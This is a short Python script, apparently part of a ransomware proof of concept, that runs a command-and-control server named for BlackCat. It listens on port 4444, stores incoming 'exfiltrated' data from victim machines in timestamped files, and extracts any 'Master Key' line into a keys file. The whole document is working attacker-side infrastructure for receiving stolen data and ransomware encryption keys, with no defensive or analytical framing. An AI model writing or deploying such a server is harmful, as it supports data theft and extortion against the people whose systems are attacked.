#!/usr/bin/env python3
"""
Simple C2 server for BlackCat PoC
Just receives and saves exfiltrated data
"""

import socket
import struct
from datetime import datetime
import os

def simple_c2_server(port=4444):
    """Простой сервер для приема эксфильтрированных данных"""
    
    print(f"[*] Starting BlackCat C2 server on port {port}")
    print(f"[*] Data will be saved in current directory")
    print(f"[*] Press Ctrl+C to stop\n")
    
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', port))
        s.listen(5)
        
        while True:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr[0]}:{addr[1]}")
            
            try:
                conn.settimeout(30)
                
                # Получаем данные
                data = b""
                while True:
                    chunk = conn.recv(4096)
                    if not chunk:
                        break
                    data += chunk
                
                if data:
                    # Сохраняем с timestamp
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    filename = f"blackcat_exfil_{addr[0]}_{timestamp}.enc"
                    
                    with open(filename, 'wb') as f:
                        f.write(data)
                    
                    print(f"[+] Saved {len(data)} bytes to {filename}")
                    
                    # Пытаемся найти ключ в данных
                    if b'Master Key:' in data:
                        start = data.find(b'Master Key:') + 11
                        end = data.find(b'\n', start)
                        if end != -1:
                            key = data[start:end].strip().decode('utf-8', errors='ignore')
                            print(f"[!] Found encryption key in data: {key[:32]}...")
                            
                            # Сохраняем ключ в отдельный файл
                            with open("keys.txt", "a") as key_file:
                                key_file.write(f"{timestamp} - {addr[0]} - {key}\n")
                    
                    # Показываем первые 100 байт
                    print(f"[*] First 100 bytes (hex): {data[:100].hex()}")
                    
                else:
                    print("[-] No data received")
                    
            except socket.timeout:
                print("[-] Connection timeout")
            except Exception as e:
                print(f"[-] Error: {e}")
            finally:
                conn.close()

if __name__ == "__main__":
    try:
        simple_c2_server(4444)
    except KeyboardInterrupt:
        print("\n[*] Server stopped by user")